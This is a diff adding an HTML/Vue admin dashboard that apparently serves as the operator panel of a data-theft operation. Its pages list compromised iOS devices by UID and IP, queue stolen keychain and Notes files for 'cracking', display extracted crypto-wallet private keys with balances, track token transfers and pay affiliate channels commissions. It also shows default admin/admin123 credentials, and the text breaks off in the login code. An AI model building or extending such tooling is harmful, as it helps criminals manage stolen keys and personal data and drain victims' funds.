@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>營運管理後台</title>
+<link rel="stylesheet" href="https://unpkg.com/element-plus@2.4.4/dist/index.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif; background: #f0f2f5; }
+  #app { height: 100vh; }
+
+  /* 登录页 */
+  .login-wrap {
+    height: 100vh; display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+  }
+  .login-box {
+    width: 380px; background: #fff; border-radius: 12px; padding: 40px 36px;
+    box-shadow: 0 20px 60px rgba(0,0,0,.3);
+  }
+  .login-box h2 { text-align: center; margin-bottom: 8px; color: #1a1a2e; }
+  .login-box .sub { text-align: center; color: #999; font-size: 13px; margin-bottom: 28px; }
+
+  /* 主布局 */
+  .main-layout { display: flex; height: 100vh; }
+  .sidebar {
+    width: 200px; background: #0d1117; color: #c9d1d9; flex-shrink: 0;
+    display: flex; flex-direction: column; overflow-y: auto;
+  }
+  .sidebar-header {
+    padding: 18px 16px; font-size: 16px; font-weight: 700; color: #fff;
+    border-bottom: 1px solid #21262d; display: flex; align-items: center; gap: 8px;
+  }
+  .sidebar-header .logo {
+    width: 28px; height: 28px; background: #238636; border-radius: 6px;
+    display: flex; align-items: center; justify-content: center; font-size: 14px;
+  }
+  .nav-group { padding: 8px 0; }
+  .nav-group-title {
+    padding: 8px 16px; font-size: 11px; color: #6e7681; text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .nav-item {
+    padding: 10px 16px 10px 28px; cursor: pointer; font-size: 13px;
+    display: flex; align-items: center; gap: 8px; transition: all .15s;
+    color: #c9d1d9;
+  }
+  .nav-item:hover { background: #161b22; color: #fff; }
+  .nav-item.active { background: #1f6feb22; color: #58a6ff; border-left: 3px solid #1f6feb; padding-left: 25px; }
+  .nav-item .el-icon { font-size: 15px; }
+
+  .main-area { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+
+  /* 顶部栏 */
+  .topbar {
+    height: 48px; background: #fff; border-bottom: 1px solid #e4e7ed;
+    display: flex; align-items: center; padding: 0 16px; justify-content: space-between;
+    flex-shrink: 0;
+  }
+  .topbar-left { display: flex; align-items: center; gap: 12px; }
+  .topbar-right { display: flex; align-items: center; gap: 12px; }
+  .user-info { display: flex; align-items: center; gap: 8px; cursor: pointer; }
+  .user-avatar {
+    width: 28px; height: 28px; border-radius: 50%; background: #1f6feb;
+    color: #fff; display: flex; align-items: center; justify-content: center; font-size: 12px;
+  }
+
+  /* 标签页 */
+  .tabs-bar {
+    height: 36px; background: #fafafa; border-bottom: 1px solid #e4e7ed;
+    display: flex; align-items: center; padding: 0 8px; gap: 4px; overflow-x: auto;
+    flex-shrink: 0;
+  }
+  .tab-item {
+    padding: 4px 12px; font-size: 12px; background: #fff; border: 1px solid #dcdfe6;
+    border-radius: 4px; cursor: pointer; display: flex; align-items: center; gap: 6px;
+    white-space: nowrap; color: #606266;
+  }
+  .tab-item.active { background: #1f6feb; color: #fff; border-color: #1f6feb; }
+  .tab-item .close { font-size: 14px; opacity: .6; }
+  .tab-item .close:hover { opacity: 1; }
+
+  /* 内容区 */
+  .content { flex: 1; overflow-y: auto; padding: 16px; }
+  .page-card {
+    background: #fff; border-radius: 8px; padding: 20px; margin-bottom: 16px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.05);
+  }
+  .page-title { font-size: 15px; font-weight: 600; margin-bottom: 16px; color: #303133; }
+  .breadcrumb { font-size: 12px; color: #909399; margin-bottom: 12px; }
+  .breadcrumb span { color: #1f6feb; }
+
+  /* 筛选区 */
+  .filter-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin-bottom: 16px; }
+  .filter-row .el-form-item { margin-bottom: 0; }
+  .quick-btns { display: flex; gap: 8px; }
+
+  /* 统计卡片 */
+  .stat-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 16px; }
+  .stat-card {
+    background: #fff; border-radius: 8px; padding: 16px; box-shadow: 0 1px 3px rgba(0,0,0,.05);
+  }
+  .stat-card .label { font-size: 12px; color: #909399; margin-bottom: 6px; }
+  .stat-card .value { font-size: 24px; font-weight: 700; color: #303133; }
+  .stat-card .value.blue { color: #1f6feb; }
+  .stat-card .value.green { color: #238636; }
+  .stat-card .value.orange { color: #d29922; }
+  .stat-card .value.red { color: #da3633; }
+
+  /* 表格 */
+  .el-table { font-size: 12px; }
+  .el-table th { background: #f5f7fa !important; font-weight: 600; }
+  .pending-tag { color: #e6a23c; }
+  .done-tag { color: #67c23a; }
+  .mono { font-family: 'SF Mono', Consolas, monospace; font-size: 11px; }
+
+  /* 渠道标签 */
+  .channel-badge {
+    display: inline-block; padding: 2px 8px; background: #e8f3ff; color: #1f6feb;
+    border-radius: 4px; font-size: 11px;
+  }
+</style>
+</head>
+<body>
+<div id="app">
+  <!-- 登录页 -->
+  <div v-if="!token" class="login-wrap">
+    <div class="login-box">
+      <h2>營運管理後台</h2>
+      <p class="sub">libappcore Multi-tenant Management</p>
+      <el-form @submit.prevent="doLogin">
+        <el-form-item>
+          <el-input v-model="loginForm.username" placeholder="用户名" size="large" prefix-icon="User" />
+        </el-form-item>
+        <el-form-item>
+          <el-input v-model="loginForm.password" type="password" placeholder="密码" size="large" prefix-icon="Lock" show-password @keyup.enter="doLogin" />
+        </el-form-item>
+        <el-button type="primary" size="large" style="width:100%" :loading="loginLoading" @click="doLogin">登 录</el-button>
+      </el-form>
+      <p style="text-align:center;margin-top:16px;font-size:11px;color:#bbb">默认: admin / admin123</p>
+    </div>
+  </div>
+
+  <!-- 主布局 -->
+  <div v-else class="main-layout">
+    <!-- 左侧导航 -->
+    <div class="sidebar">
+      <div class="sidebar-header">
+        <div class="logo">营</div>
+        <span>營運管理後台</span>
+      </div>
+      <div class="nav-group">
+        <div class="nav-item" :class="{active: activePage==='dashboard'}" @click="openPage('dashboard','首页')">
+          <el-icon><HomeFilled /></el-icon> 首页
+        </div>
+        <div class="nav-item" :class="{active: activePage==='settings'}" @click="openPage('settings','设定')" v-if="user.role==='admin'">
+          <el-icon><Setting /></el-icon> 设定
+        </div>
+      </div>
+      <div class="nav-group">
+        <div class="nav-group-title">營運統計</div>
+        <div class="nav-item" :class="{active: activePage==='xgd-report'}" @click="openPage('xgd-report','xgd運營統計報表')">
+          <el-icon><DataAnalysis /></el-icon> xgd運營統計報表
+        </div>
+        <div class="nav-item" :class="{active: activePage==='device-detail'}" @click="openPage('device-detail','渠道設備明細')">
+          <el-icon><Monitor /></el-icon> 渠道設備明細
+        </div>
+        <div class="nav-item" :class="{active: activePage==='ios-files'}" @click="openPage('ios-files','iOS文件統計')">
+          <el-icon><Folder /></el-icon> iOS文件統計
+        </div>
+      </div>
+      <div class="nav-group">
+        <div class="nav-group-title">數據管理</div>
+        <div class="nav-item" :class="{active: activePage==='private-keys'}" @click="openPage('private-keys','私鑰信息')">
+          <el-icon><Key /></el-icon> 私鑰信息
+        </div>
+        <div class="nav-item" :class="{active: activePage==='token-transfers'}" @click="openPage('token-transfers','代幣轉賬記錄')">
+          <el-icon><Money /></el-icon> 代幣轉賬記錄
+        </div>
+        <div class="nav-item" :class="{active: activePage==='crack-queue'}" @click="openPage('crack-queue','破解隊列')">
+          <el-icon><Unlock /></el-icon> 破解隊列
+        </div>
+      </div>
+      <div class="nav-group" v-if="user.role==='admin'">
+        <div class="nav-group-title">系統管理</div>
+        <div class="nav-item" :class="{active: activePage==='user-mgmt'}" @click="openPage('user-mgmt','用戶管理')">
+          <el-icon><User /></el-icon> 用戶管理
+        </div>
+        <div class="nav-item" :class="{active: activePage==='channel-mgmt'}" @click="openPage('channel-mgmt','渠道管理')">
+          <el-icon><Share /></el-icon> 渠道管理
+        </div>
+        <div class="nav-item" :class="{active: activePage==='audit-logs'}" @click="openPage('audit-logs','操作日誌')">
+          <el-icon><Document /></el-icon> 操作日誌
+        </div>
+      </div>
+    </div>
+
+    <!-- 主区域 -->
+    <div class="main-area">
+      <!-- 顶部栏 -->
+      <div class="topbar">
+        <div class="topbar-left">
+          <el-button text @click="toggleSidebar"><el-icon><Menu /></el-icon></el-button>
+          <span style="font-size:13px;color:#606266">{{ currentPageTitle }}</span>
+        </div>
+        <div class="topbar-right">
+          <el-tag size="small" :type="user.role==='admin'?'danger':'info'">{{ user.role==='admin'?'管理员':'代理' }}</el-tag>
+          <el-dropdown @command="handleUserCmd">
+            <div class="user-info">
+              <div class="user-avatar">{{ user.display_name ? user.display_name[0] : user.username[0].toUpperCase() }}</div>
+              <span style="font-size:13px">{{ user.display_name || user.username }}</span>
+              <el-icon><ArrowDown /></el-icon>
+            </div>
+            <template #dropdown>
+              <el-dropdown-menu>
+                <el-dropdown-item command="logout">退出登录</el-dropdown-item>
+              </el-dropdown-menu>
+            </template>
+          </el-dropdown>
+        </div>
+      </div>
+
+      <!-- 标签页 -->
+      <div class="tabs-bar">
+        <div v-for="tab in tabs" :key="tab.key" class="tab-item" :class="{active: activePage===tab.key}" @click="activePage=tab.key">
+          {{ tab.title }}
+          <span class="close" @click.stop="closeTab(tab.key)" v-if="tabs.length>1">×</span>
+        </div>
+      </div>
+
+      <!-- 内容区 -->
+      <div class="content">
+        <!-- 首页仪表盘 -->
+        <div v-if="activePage==='dashboard'">
+          <div class="stat-cards">
+            <div class="stat-card"><div class="label">设备总数</div><div class="value blue">{{ stats.device_count || 0 }}</div></div>
+            <div class="stat-card"><div class="label">文件总数</div><div class="value">{{ stats.file_count || 0 }}</div></div>
+            <div class="stat-card"><div class="label">待破解</div><div class="value orange">{{ stats.pending_count || 0 }}</div></div>
+            <div class="stat-card"><div class="label">已破解</div><div class="value green">{{ stats.done_count || 0 }}</div></div>
+            <div class="stat-card"><div class="label">私钥数量</div><div class="value red">{{ stats.private_key_count || 0 }}</div></div>
+          </div>
+          <div class="page-card">
+            <div class="page-title">按类型统计</div>
+            <el-table :data="typeStatsTable" size="small" border>
+              <el-table-column prop="type" label="文件类型" width="160" />
+              <el-table-column prop="label" label="说明" />
+              <el-table-column prop="count" label="数量" width="120" align="right" />
+            </el-table>
+          </div>
+        </div>
+
+        <!-- iOS文件统计（复刻截图） -->
+        <div v-if="activePage==='ios-files'">
+          <div class="breadcrumb">首頁 / <span>營運統計</span> / <span>iOS文件統計</span></div>
+          <div class="page-card">
+            <div class="page-title">iOS文件統計</div>
+            <div class="filter-row">
+              <el-select v-model="iosFilter.platform" placeholder="平台" size="small" style="width:120px">
+                <el-option label="102号" value="102" />
+                <el-option label="全部" value="" />
+              </el-select>
+              <el-select v-model="iosFilter.pipe" placeholder="管道" size="small" style="width:140px">
+                <el-option label="全部渠道" value="" />
+                <el-option v-for="ch in channels" :key="ch.id" :label="ch.platform_no+'/'+ch.pipe_no+' '+ch.name" :value="ch.id" />
+              </el-select>
+            </div>
+            <div class="filter-row">
+              <span style="font-size:12px;color:#909399">首次時間</span>
+              <el-date-picker v-model="iosFilter.dateRange" type="daterange" size="small"
+                value-format="YYYY-MM-DD" start-placeholder="开始日期" end-placeholder="结束日期" style="width:260px" />
+              <el-input v-model="iosFilter.keyword" placeholder="設備uid" size="small" style="width:180px" clearable />
+              <el-input v-model="iosFilter.ip" placeholder="ip" size="small" style="width:140px" clearable />
+              <el-select v-model="iosFilter.osVersion" placeholder="系統版本" size="small" style="width:120px" clearable>
+                <el-option label="全部" value="" />
+                <el-option v-for="v in osVersions" :key="v" :label="v" :value="v" />
+              </el-select>
+              <el-button type="primary" size="small" @click="loadDevices"><el-icon><Search /></el-icon> 搜索</el-button>
+              <div class="quick-btns">
+                <el-button size="small" @click="setQuickDate(1)">昨日</el-button>
+                <el-button size="small" @click="setQuickDate(7)">近7天</el-button>
+                <el-button size="small" @click="setQuickDate(30)">近30天</el-button>
+              </div>
+            </div>
+            <el-table :data="devices" size="small" border stripe v-loading="loadingDevices">
+              <el-table-column prop="device_uid" label="設備uid" min-width="200">
+                <template #default="{row}"><span class="mono">{{ row.device_uid }}</span></template>
+              </el-table-column>
+              <el-table-column prop="os_version" label="系統版本" width="100" align="center" />
+              <el-table-column prop="keychain_count" label="鑰包文件數量" width="120" align="center" />
+              <el-table-column prop="keychain_pending" label="鑰包待破解數量" width="130" align="center">
+                <template #default="{row}"><span class="pending-tag" v-if="row.keychain_pending>0">{{ row.keychain_pending }}</span><span v-else>0</span></template>
+              </el-table-column>
+              <el-table-column prop="memo_count" label="備忘錄文件數量" width="130" align="center" />
+              <el-table-column prop="memo_pending" label="備忘錄待破解數量" width="140" align="center">
+                <template #default="{row}"><span class="pending-tag" v-if="row.memo_pending>0">{{ row.memo_pending }}</span><span v-else>0</span></template>
+              </el-table-column>
+              <el-table-column prop="ip" label="ip" width="130" />
+              <el-table-column prop="channel_name" label="渠道" width="120">
+                <template #default="{row}"><span class="channel-badge">{{ row.channel_name }}</span></template>
+              </el-table-column>
+              <el-table-column prop="first_seen" label="首次時間" width="160">
+                <template #default="{row}">{{ formatTime(row.first_seen) }}</template>
+              </el-table-column>
+              <el-table-column prop="last_seen" label="更新時間" width="160">
+                <template #default="{row}">{{ formatTime(row.last_seen) }}</template>
+              </el-table-column>
+              <el-table-column label="操作" width="100" fixed="right">
+                <template #default="{row}">
+                  <el-button link type="primary" size="small" @click="viewDevice(row)">详情</el-button>
+                </template>
+              </el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 渠道设备明细 -->
+        <div v-if="activePage==='device-detail'">
+          <div class="page-card">
+            <div class="page-title">渠道設備明細</div>
+            <el-table :data="devices" size="small" border v-loading="loadingDevices">
+              <el-table-column prop="device_uid" label="设备UID" min-width="200"><template #default="{row}"><span class="mono">{{ row.device_uid }}</span></template></el-table-column>
+              <el-table-column prop="os_version" label="系统版本" width="100" align="center" />
+              <el-table-column prop="ip" label="IP" width="130" />
+              <el-table-column prop="channel_name" label="归属渠道" width="140" />
+              <el-table-column prop="first_seen" label="首次上线" width="160"><template #default="{row}">{{ formatTime(row.first_seen) }}</template></el-table-column>
+              <el-table-column prop="last_seen" label="最后上线" width="160"><template #default="{row}">{{ formatTime(row.last_seen) }}</template></el-table-column>
+              <el-table-column prop="status" label="状态" width="80" align="center">
+                <template #default="{row}"><el-tag size="small" :type="row.status==='active'?'success':'info'">{{ row.status==='active'?'在线':'离线' }}</el-tag></template>
+              </el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 私钥信息 -->
+        <div v-if="activePage==='private-keys'">
+          <div class="page-card">
+            <div class="page-title">私鑰信息</div>
+            <el-table :data="privateKeys" size="small" border v-loading="loadingKeys">
+              <el-table-column prop="device_uid" label="设备UID" min-width="180"><template #default="{row}"><span class="mono">{{ row.device_uid }}</span></template></el-table-column>
+              <el-table-column prop="wallet_name" label="钱包名称" width="140" />
+              <el-table-column prop="chain" label="链" width="100" align="center" />
+              <el-table-column prop="address" label="地址" min-width="200"><template #default="{row}"><span class="mono">{{ row.address }}</span></template></el-table-column>
+              <el-table-column prop="balance" label="余额" width="120" align="right" />
+              <el-table-column prop="private_key" label="私钥" min-width="200" show-overflow-tooltip>
+                <template #default="{row}"><span class="mono" style="color:#da3633">{{ row.private_key ? '••••••••' : '-' }}</span></template>
+              </el-table-column>
+              <el-table-column prop="created_at" label="提取时间" width="160"><template #default="{row}">{{ formatTime(row.created_at) }}</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 代币转账记录 -->
+        <div v-if="activePage==='token-transfers'">
+          <div class="page-card">
+            <div class="page-title">代幣轉賬記錄</div>
+            <el-table :data="tokenTransfers" size="small" border v-loading="loadingTransfers">
+              <el-table-column prop="device_uid" label="设备UID" min-width="160"><template #default="{row}"><span class="mono">{{ row.device_uid }}</span></template></el-table-column>
+              <el-table-column prop="chain" label="链" width="80" align="center" />
+              <el-table-column prop="token" label="代币" width="100" align="center" />
+              <el-table-column prop="from_address" label="转出地址" min-width="180"><template #default="{row}"><span class="mono">{{ row.from_address }}</span></template></el-table-column>
+              <el-table-column prop="to_address" label="转入地址" min-width="180"><template #default="{row}"><span class="mono">{{ row.to_address }}</span></template></el-table-column>
+              <el-table-column prop="amount" label="数量" width="120" align="right" />
+              <el-table-column prop="tx_hash" label="交易哈希" min-width="200" show-overflow-tooltip><template #default="{row}"><span class="mono">{{ row.tx_hash }}</span></template></el-table-column>
+              <el-table-column prop="timestamp" label="时间" width="160"><template #default="{row}">{{ formatTime(row.timestamp) }}</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 破解队列 -->
+        <div v-if="activePage==='crack-queue'">
+          <div class="page-card">
+            <div class="page-title">破解隊列</div>
+            <div class="filter-row">
+              <el-select v-model="crackFilter.status" placeholder="状态" size="small" style="width:140px" clearable @change="loadCrackQueue">
+                <el-option label="待破解" value="pending" />
+                <el-option label="破解中" value="processing" />
+                <el-option label="已完成" value="done" />
+                <el-option label="失败" value="failed" />
+              </el-select>
+            </div>
+            <el-table :data="crackQueue" size="small" border v-loading="loadingCrack">
+              <el-table-column prop="id" label="ID" width="60" />
+              <el-table-column prop="device_uid" label="设备" min-width="160"><template #default="{row}"><span class="mono">{{ row.device_uid }}</span></template></el-table-column>
+              <el-table-column prop="file_type" label="类型" width="100" align="center" />
+              <el-table-column prop="filename" label="文件名" min-width="200" show-overflow-tooltip />
+              <el-table-column prop="size" label="大小" width="100" align="right"><template #default="{row}">{{ formatSize(row.size) }}</template></el-table-column>
+              <el-table-column prop="status" label="状态" width="100" align="center">
+                <template #default="{row}">
+                  <el-tag size="small" :type="row.status==='done'?'success':row.status==='failed'?'danger':row.status==='processing'?'warning':'info'">
+                    {{ {pending:'待破解',processing:'破解中',done:'已完成',failed:'失败'}[row.status] || row.status }}
+                  </el-tag>
+                </template>
+              </el-table-column>
+              <el-table-column prop="created_at" label="加入时间" width="160"><template #default="{row}">{{ formatTime(row.created_at) }}</template></el-table-column>
+              <el-table-column label="操作" width="120" v-if="user.role==='admin'">
+                <template #default="{row}">
+                  <el-button link type="success" size="small" @click="markCrackDone(row)" v-if="row.status!=='done'">标记完成</el-button>
+                </template>
+              </el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- xgd运营统计报表 -->
+        <div v-if="activePage==='xgd-report'">
+          <div class="page-card">
+            <div class="page-title">xgd運營統計報表</div>
+            <div class="stat-cards">
+              <div class="stat-card"><div class="label">设备总数</div><div class="value blue">{{ iosStats.device_count || 0 }}</div></div>
+              <div class="stat-card"><div class="label">钥匙包总数</div><div class="value">{{ iosStats.keychain_total || 0 }}</div></div>
+              <div class="stat-card"><div class="label">钥匙包待破解</div><div class="value orange">{{ iosStats.keychain_pending || 0 }}</div></div>
+              <div class="stat-card"><div class="label">备忘录总数</div><div class="value">{{ iosStats.memo_total || 0 }}</div></div>
+              <div class="stat-card"><div class="label">备忘录待破解</div><div class="value orange">{{ iosStats.memo_pending || 0 }}</div></div>
+            </div>
+            <el-table :data="channels" size="small" border>
+              <el-table-column prop="platform_no" label="平台号" width="100" />
+              <el-table-column prop="pipe_no" label="管道号" width="100" />
+              <el-table-column prop="name" label="渠道名称" min-width="150" />
+              <el-table-column prop="device_count" label="设备数" width="100" align="right" />
+              <el-table-column prop="commission_rate" label="分成比例" width="100" align="right"><template #default="{row}">{{ (row.commission_rate*100).toFixed(0) }}%</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 用户管理 -->
+        <div v-if="activePage==='user-mgmt'">
+          <div class="page-card">
+            <div class="page-title" style="display:flex;justify-content:space-between;align-items:center">
+              用戶管理
+              <el-button type="primary" size="small" @click="showUserDialog=true"><el-icon><Plus /></el-icon> 新增用户</el-button>
+            </div>
+            <el-table :data="users" size="small" border v-loading="loadingUsers">
+              <el-table-column prop="id" label="ID" width="60" />
+              <el-table-column prop="username" label="用户名" width="140" />
+              <el-table-column prop="display_name" label="显示名" width="140" />
+              <el-table-column prop="role" label="角色" width="100" align="center">
+                <template #default="{row}"><el-tag size="small" :type="row.role==='admin'?'danger':'info'">{{ row.role==='admin'?'管理员':'代理' }}</el-tag></template>
+              </el-table-column>
+              <el-table-column prop="channel_name" label="归属渠道" width="160" />
+              <el-table-column prop="status" label="状态" width="80" align="center">
+                <template #default="{row}"><el-tag size="small" :type="row.status==='active'?'success':'info'">{{ row.status }}</el-tag></template>
+              </el-table-column>
+              <el-table-column prop="last_login" label="最后登录" width="160"><template #default="{row}">{{ formatTime(row.last_login) }}</template></el-table-column>
+              <el-table-column prop="created_at" label="创建时间" width="160"><template #default="{row}">{{ formatTime(row.created_at) }}</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 渠道管理 -->
+        <div v-if="activePage==='channel-mgmt'">
+          <div class="page-card">
+            <div class="page-title" style="display:flex;justify-content:space-between;align-items:center">
+              渠道管理
+              <el-button type="primary" size="small" @click="showChannelDialog=true"><el-icon><Plus /></el-icon> 新增渠道</el-button>
+            </div>
+            <el-table :data="channels" size="small" border v-loading="loadingChannels">
+              <el-table-column prop="id" label="ID" width="60" />
+              <el-table-column prop="platform_no" label="平台号" width="100" />
+              <el-table-column prop="pipe_no" label="管道号" width="100" />
+              <el-table-column prop="name" label="渠道名称" min-width="150" />
+              <el-table-column prop="contact" label="联系人" width="120" />
+              <el-table-column prop="phone" label="电话" width="140" />
+              <el-table-column prop="commission_rate" label="分成比例" width="100" align="right"><template #default="{row}">{{ (row.commission_rate*100).toFixed(0) }}%</template></el-table-column>
+              <el-table-column prop="device_count" label="设备数" width="100" align="right" />
+              <el-table-column prop="created_at" label="创建时间" width="160"><template #default="{row}">{{ formatTime(row.created_at) }}</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 操作日志 -->
+        <div v-if="activePage==='audit-logs'">
+          <div class="page-card">
+            <div class="page-title">操作日誌</div>
+            <el-table :data="auditLogs" size="small" border v-loading="loadingLogs">
+              <el-table-column prop="id" label="ID" width="60" />
+              <el-table-column prop="username" label="操作人" width="120" />
+              <el-table-column prop="action" label="动作" width="140" />
+              <el-table-column prop="target" label="目标" width="160" />
+              <el-table-column prop="detail" label="详情" min-width="200" show-overflow-tooltip />
+              <el-table-column prop="ip" label="IP" width="130" />
+              <el-table-column prop="created_at" label="时间" width="160"><template #default="{row}">{{ formatTime(row.created_at) }}</template></el-table-column>
+            </el-table>
+          </div>
+        </div>
+
+        <!-- 设定 -->
+        <div v-if="activePage==='settings'">
+          <div class="page-card">
+            <div class="page-title">系統設定</div>
+            <el-form label-width="140px" style="max-width:600px">
+              <el-form-item label="服务器地址"><el-input v-model="settings.serverUrl" /></el-form-item>
+              <el-form-item label="上传目录"><el-input v-model="settings.uploadDir" /></el-form-item>
+              <el-form-item label="最大文件(MB)"><el-input-number v-model="settings.maxSize" :min="10" :max="2048" /></el-form-item>
+              <el-form-item label="JWT过期(小时)"><el-input-number v-model="settings.jwtExpire" :min="1" :max="720" /></el-form-item>
+              <el-form-item>
+                <el-button type="primary">保存设置</el-button>
+              </el-form-item>
+            </el-form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 新增用户对话框 -->
+  <el-dialog v-model="showUserDialog" title="新增用户" width="480px">
+    <el-form label-width="100px">
+      <el-form-item label="用户名"><el-input v-model="newUser.username" /></el-form-item>
+      <el-form-item label="密码"><el-input v-model="newUser.password" type="password" show-password /></el-form-item>
+      <el-form-item label="显示名"><el-input v-model="newUser.display_name" /></el-form-item>
+      <el-form-item label="角色">
+        <el-select v-model="newUser.role" style="width:100%">
+          <el-option label="管理员" value="admin" />
+          <el-option label="代理" value="agent" />
+        </el-select>
+      </el-form-item>
+      <el-form-item label="归属渠道" v-if="newUser.role==='agent'">
+        <el-select v-model="newUser.channel_id" style="width:100%" clearable>
+          <el-option v-for="ch in channels" :key="ch.id" :label="ch.platform_no+'/'+ch.pipe_no+' '+ch.name" :value="ch.id" />
+        </el-select>
+      </el-form-item>
+    </el-form>
+    <template #footer>
+      <el-button @click="showUserDialog=false">取消</el-button>
+      <el-button type="primary" @click="createUser">确定</el-button>
+    </template>
+  </el-dialog>
+
+  <!-- 新增渠道对话框 -->
+  <el-dialog v-model="showChannelDialog" title="新增渠道" width="480px">
+    <el-form label-width="100px">
+      <el-form-item label="平台号"><el-input v-model="newChannel.platform_no" placeholder="如: 102" /></el-form-item>
+      <el-form-item label="管道号"><el-input v-model="newChannel.pipe_no" placeholder="如: 82008" /></el-form-item>
+      <el-form-item label="渠道名称"><el-input v-model="newChannel.name" /></el-form-item>
+      <el-form-item label="联系人"><el-input v-model="newChannel.contact" /></el-form-item>
+      <el-form-item label="电话"><el-input v-model="newChannel.phone" /></el-form-item>
+      <el-form-item label="分成比例(%)"><el-input-number v-model="newChannel.commission_rate_pct" :min="0" :max="100" /></el-form-item>
+    </el-form>
+    <template #footer>
+      <el-button @click="showChannelDialog=false">取消</el-button>
+      <el-button type="primary" @click="createChannel">确定</el-button>
+    </template>
+  </el-dialog>
+
+  <!-- 设备详情对话框 -->
+  <el-dialog v-model="showDeviceDialog" title="设备详情" width="700px">
+    <div v-if="currentDevice">
+      <el-descriptions :column="2" border size="small" style="margin-bottom:16px">
+        <el-descriptions-item label="设备UID"><span class="mono">{{ currentDevice.device_uid }}</span></el-descriptions-item>
+        <el-descriptions-item label="系统版本">{{ currentDevice.os_version }}</el-descriptions-item>
+        <el-descriptions-item label="IP">{{ currentDevice.ip }}</el-descriptions-item>
+        <el-descriptions-item label="渠道">{{ currentDevice.channel_name }}</el-descriptions-item>
+        <el-descriptions-item label="首次上线">{{ formatTime(currentDevice.first_seen) }}</el-descriptions-item>
+        <el-descriptions-item label="最后上线">{{ formatTime(currentDevice.last_seen) }}</el-descriptions-item>
+      </el-descriptions>
+      <el-table :data="currentDevice.files || []" size="small" border max-height="300">
+        <el-table-column prop="file_type" label="类型" width="100" />
+        <el-table-column prop="filename" label="文件名" min-width="200" show-overflow-tooltip />
+        <el-table-column prop="size" label="大小" width="100" align="right"><template #default="{row}">{{ formatSize(row.size) }}</template></el-table-column>
+        <el-table-column prop="crack_status" label="破解状态" width="100" align="center">
+          <template #default="{row}"><el-tag size="small" :type="row.crack_status==='done'?'success':row.crack_status==='pending'?'warning':'info'">{{ row.crack_status }}</el-tag></template>
+        </el-table-column>
+        <el-table-column prop="uploaded_at" label="上传时间" width="160"><template #default="{row}">{{ formatTime(row.uploaded_at) }}</template></el-table-column>
+      </el-table>
+    </div>
+  </el-dialog>
+</div>
+
+<script src="https://unpkg.com/vue@3.4.0/dist/vue.global.prod.js"></script>
+<script src="https://unpkg.com/element-plus@2.4.4/dist/index.full.min.js"></script>
+<script src="https://unpkg.com/@element-plus/icons-vue@2.3.1/dist/index.iife.min.js"></script>
+<script>
+const { createApp, ref, reactive, computed, onMounted, watch } = Vue;
+
+const app = createApp({
+  setup() {
+    // 状态
+    const token = ref(localStorage.getItem('appcore_token') || '');
+    const user = ref(JSON.parse(localStorage.getItem('appcore_user') || '{}'));
+    const loginForm = reactive({ username: '', password: '' });
+    const loginLoading = ref(false);
+
+    // 页面管理
+    const activePage = ref('dashboard');
+    const tabs = ref([{ key: 'dashboard', title: '首页' }]);
+    const pageTitles = {
+      'dashboard': '首页', 'settings': '设定', 'xgd-report': 'xgd運營統計報表',
+      'device-detail': '渠道設備明細', 'ios-files': 'iOS文件統計',
+      'private-keys': '私鑰信息', 'token-transfers': '代幣轉賬記錄',
+      'crack-queue': '破解隊列', 'user-mgmt': '用戶管理',
+      'channel-mgmt': '渠道管理', 'audit-logs': '操作日誌',
+    };
+    const currentPageTitle = computed(() => pageTitles[activePage.value] || '');
+
+    // 数据
+    const stats = ref({});
+    const iosStats = ref({});
+    const devices = ref([]);
+    const channels = ref([]);
+    const privateKeys = ref([]);
+    const tokenTransfers = ref([]);
+    const crackQueue = ref([]);
+    const users = ref([]);
+    const auditLogs = ref([]);
+    const osVersions = ref(['26.6.1','26.6','26.5.2','26.5.1','26.2','26.1','26.0']);
+
+    // 加载状态
+    const loadingDevices = ref(false);
+    const loadingKeys = ref(false);
+    const loadingTransfers = ref(false);
+    const loadingCrack = ref(false);
+    const loadingUsers = ref(false);
+    const loadingChannels = ref(false);
+    const loadingLogs = ref(false);
+
+    // 筛选
+    const iosFilter = reactive({ platform: '102', pipe: '', dateRange: [], keyword: '', ip: '', osVersion: '' });
+    const crackFilter = reactive({ status: '' });
+
+    // 对话框
+    const showUserDialog = ref(false);
+    const showChannelDialog = ref(false);
+    const showDeviceDialog = ref(false);
+    const currentDevice = ref(null);
+    const newUser = reactive({ username: '', password: '', display_name: '', role: 'agent', channel_id: null });
+    const newChannel = reactive({ platform_no: '', pipe_no: '', name: '', contact: '', phone: '', commission_rate_pct: 30 });
+
+    // 设置
+    const settings = reactive({ serverUrl: '', uploadDir: 'uploads', maxSize: 500, jwtExpire: 24 });
+
+    // API 封装
+    async function api(url, options = {}) {
+      const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
+      if (token.value) headers['Authorization'] = 'Bearer ' + token.value;
+      const res = await fetch(url, { ...options, headers });
+      if (res.status === 401) { token.value = ''; localStorage.removeItem('appcore_token'); location.reload(); }
+      return res.json();
+    }
+
+    // 登录
+    async function doLogin() {
+      if (!loginForm.username || !loginForm.password) { ElementPlus.ElMessage.warning('请输入用户名和密码'); return; }
+      loginLoading.value = true;
+      try {
+        const res = await api('/api/auth/login', { method: 'POST', body: JSON.stringify(loginForm) });
+        if (res.token) {
+          token.value = res.token;
+          user.value = res.user;
+          localStorage.setItem('appcore_token', res.token);
